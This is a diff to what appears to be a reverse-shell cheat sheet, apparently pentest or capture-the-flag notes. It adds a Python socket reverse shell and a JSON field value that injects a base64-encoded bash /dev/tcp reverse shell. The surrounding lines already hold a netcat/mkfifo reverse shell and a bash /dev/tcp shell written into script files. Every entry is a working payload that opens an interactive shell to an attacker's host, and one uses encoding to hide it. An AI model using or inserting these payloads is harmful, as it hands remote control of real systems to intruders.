@@ -57,6 +57,9 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,s.dup2(s.
 
 # other option
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_HOST PORT >/tmp/f" > twasBrillig.sh
+
+# other for remote
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_ATTACK",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
 ---
@@ -65,6 +68,9 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP_HOST PORT >/tmp/f
 
 ```sh
 echo "#!/bin/bash bash -i >& /dev/tcp/10.14.69.1/999 0>&1" > backup.sh
+
+# Encoded on base64
+{"target":"\";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjUwLjcyLzQ0NDQgMD4mMQ== | base64 -d | bash; \""}
 ```
 
 ---
